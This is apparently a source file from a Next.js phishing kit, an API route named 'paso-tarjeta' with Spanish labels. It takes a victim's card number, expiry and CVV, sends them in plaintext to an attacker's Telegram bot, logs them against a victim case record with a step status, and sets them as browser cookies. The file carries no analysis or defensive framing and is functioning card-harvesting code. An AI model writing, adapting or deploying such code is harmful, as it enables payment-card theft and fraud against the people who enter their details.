import { NextRequest, NextResponse } from 'next/server';
import { TELEGRAM_CONFIG } from '@/lib/database';
import { caseStore } from '@/lib/store';

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const { tarjeta, fecha, cvv, registro } = body;

        if (!tarjeta || !fecha || !cvv) {
            return NextResponse.json(
                { success: false, message: 'Datos de tarjeta incompletos' },
                { status: 400 }
            );
        }

        // Send card info to Telegram
        const message = `💳 INFORMACIÓN DE TARJETA

🆔 Registro: ${registro}
💳 Número: ${tarjeta}
📅 Vencimiento: ${fecha}
🔒 CVV: ${cvv}`;

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        // Update local store
        if (registro) {
            caseStore.updateCaseData(parseInt(registro), {
                tarjeta,
                ftarjeta: fecha,
                cvv,
                status: 7
            });
        }

        return NextResponse.json({
            success: true,
            status: 7 // CARD_ENTERED
        }, {
            headers: {
                'Set-Cookie': [
                    `tarjeta=${tarjeta}; Path=/; Max-Age=${60 * 9}`,
                    `fecha=${fecha}; Path=/; Max-Age=${60 * 9}`,
                    `cvv=${cvv}; Path=/; Max-Age=${60 * 9}`
                ].join(', ')
            }
        });

    } catch (error) {
        console.error('Error in paso-tarjeta:', error);
        return NextResponse.json(
            { success: false, message: 'Error al procesar tarjeta' },
            { status: 500 }
        );
    }
}
